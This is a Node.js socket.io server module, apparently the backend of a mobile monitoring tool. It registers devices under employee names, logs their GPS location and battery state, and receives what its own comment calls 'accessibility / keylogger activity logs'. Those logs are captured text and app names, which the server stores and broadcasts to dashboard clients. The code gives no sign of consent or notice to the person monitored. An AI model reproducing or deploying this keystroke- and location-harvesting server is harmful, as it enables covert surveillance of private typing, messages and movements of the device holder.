const Device = require('../models/device.model');
const TrackingLog = require('../models/tracking.model');

module.exports = (io, socket) => {
  // Listen for device registration
  socket.on('register_device', async (data) => {
    console.log('📱 Device registering:', data);
    try {
      const [device, created] = await Device.findOrCreate({
        where: { deviceId: data.deviceId },
        defaults: { employeeName: data.employeeName || 'Unknown' }
      });
      
      await device.update({ isOnline: true, lastSeen: new Date() });
      socket.join(data.deviceId);
      console.log(`✅ Device ${data.deviceId} is online (Socket: ${socket.id})`);
    } catch (err) {
      console.error('❌ Registration Error:', err);
    }
  });

  // Listen for location updates
  socket.on('update_location', async (data) => {
    console.log('📍 Location Update from:', data.deviceId);
    try {
      const device = await Device.findOne({ where: { deviceId: data.deviceId } });
      if (device) {
        await TrackingLog.create({
          deviceId: device.id,
          latitude: data.latitude,
          longitude: data.longitude,
          batteryLevel: data.batteryLevel,
          isCharging: data.isCharging,
          logType: 'location'
        });
        await device.update({ lastSeen: new Date() });
      }
    } catch (err) {
      console.error('❌ Location Update Error:', err);
    }
  });

  // Dashboard requests list of online devices
  socket.on('list_devices', async () => {
    try {
      const devices = await Device.findAll({ where: { isOnline: true } });
      socket.emit('devices_data', devices);
    } catch (err) {
      console.error('❌ Error fetching devices:', err);
    }
  });

  // Handle accessibility / keylogger activity logs from device
  socket.on('activity_log', async (data) => {
    console.log(`📥 Activity Log received from ${data.deviceId}:`, data.packageName, "-", (data.text || '').substring(0, 30) + "...");
    try {
      const device = await Device.findOne({ where: { deviceId: data.deviceId } });
      if (device) {
        await TrackingLog.create({
          deviceId: device.id,
          logType: 'activity',
          data: {
            packageName: data.packageName,
            text: data.text,
            timestamp: data.timestamp
          }
        });
        io.emit('activity_update', data);
      }
    } catch (err) {
      console.error('❌ Activity Log Error:', err);
    }
  });
};
